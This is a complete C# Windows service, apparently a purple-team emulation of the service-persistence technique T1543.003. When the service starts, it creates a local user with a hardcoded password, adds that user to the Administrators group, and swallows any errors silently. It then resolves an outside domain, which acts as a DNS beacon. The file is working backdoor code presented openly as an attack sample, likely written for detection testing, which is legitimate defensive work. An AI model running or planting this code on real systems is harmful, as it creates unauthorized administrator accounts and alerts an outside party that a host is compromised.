using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Net;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace T1543_003_Service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // create username 
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ", computer");
                DirectoryEntry newUser = AD.Children.Add("T1543_003", "user");
                newUser.Invoke("SetPassword", new object[] { "purpleteam.ru" });
                newUser.Invoke("Put", new object[] { "Description", "Persistence USER" });
                newUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { newUser.Path.ToString() }); }
            }
            catch (Exception ex)
            {

            }

            // 
            var replay = "t1543.purpleteam.ru";
            IPAddress[] array = Dns.GetHostAddresses(replay);

        }

        protected override void OnStop()
        {
        }
    }
}
